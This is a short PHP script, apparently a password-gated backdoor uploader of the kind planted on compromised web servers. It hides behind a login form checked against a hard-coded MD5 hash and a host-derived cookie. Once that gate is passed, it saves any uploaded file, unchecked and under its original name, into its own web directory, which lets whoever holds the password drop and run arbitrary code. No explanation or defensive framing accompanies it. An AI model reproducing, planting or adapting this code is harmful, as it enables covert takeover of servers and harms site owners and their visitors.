<?php
$a = "19d98b7e4ecf009140eb054356c717d1";
function w() {
	die("<form method=post><input type=password name=pass></form>");
}
if(!empty($a)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $a))
        c(md5($_SERVER['HTTP_HOST']), $a);

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $a))
        w();
}
function c($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

?>
<form enctype="multipart/form-data" method="post">
<input type="hidden" name="MAX_FILE_SIZE" value="100000">
Send this file: <input name="file" type="file">
<input type="submit" value="Send File">
</form>
<?php
$script_directory = substr($_SERVER['SCRIPT_FILENAME'], 0, strrpos($_SERVER['SCRIPT_FILENAME'], '/'));
move_uploaded_file($_FILES[file][tmp_name], $script_directory."/".$_FILES[file][name]);
?>
